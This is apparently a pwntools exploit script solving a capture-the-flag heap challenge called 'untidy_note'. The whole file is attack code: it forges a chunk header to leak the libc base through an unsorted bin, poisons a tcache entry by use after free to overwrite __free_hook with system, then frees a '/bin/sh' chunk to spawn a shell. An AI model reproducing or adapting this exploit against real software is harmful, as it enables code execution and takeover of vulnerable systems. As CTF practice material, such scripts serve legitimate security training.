#!/usr/bin/env python2
# coding = utf-8

from pwn import *
from LibcSearcher import *
context(arch = "amd64", os = "linux", log_level = "debug")

def send_choice(choice):
    p.recvuntil('Your choose is:\n')
    p.sendline(str(choice))

def create(size):
    send_choice(1)
    p.recvuntil('the note size is:\n')
    p.sendline(str(size))

def delete(index):
    send_choice(2)
    p.recvuntil('index:\n\n')
    p.sendline(str(index))

def edit(index, size, data):
    send_choice(3)
    p.recvuntil('index:\n')
    p.sendline(str(index))
    p.recvuntil('the size is:\n')
    p.sendline(str(size))
    p.recvuntil('Content:\n')
    p.send(data)

def show(index):
    send_choice(4)
    p.recvuntil('index:\n')
    p.sendline(str(index))
    p.recvuntil('Content:')


p = process('./untidy_note')
elf = ELF('./untidy_note')
gdb.attach(p, '')

"""
The size range of TCache is [0x20, 0x410].
"""

p.sendline("fuck")

# Step 1: Fake an unsorted bin
create(0x8)
for _ in range(0x16):
    create(0x1f)
create(0x8)

# Step 2: Leak LibC address by leaking the `fd` field of unsorted bin
delete(1)
edit(0, 0x20, '\x00' * 0x18 + p64(0x421))
delete(1)
show(1)
libc_base = u64(p.recv(6) + "\x00\x00") - 0x3ebca0
log.info('libc_base: ' + hex(libc_base))

# Step 3: TCache Chunk use after free
free_hook = libc_base + 0x3ed8e8
edit(1, 0x8, p64(free_hook))

create(0x1f)
create(0x1f)

system_libc = libc_base + 0x4f420
edit(0x16, 0x8, "/bin/sh\x00")
edit(0x17, 0x8, p64(system_libc))
delete(0x16)
p.interactive()
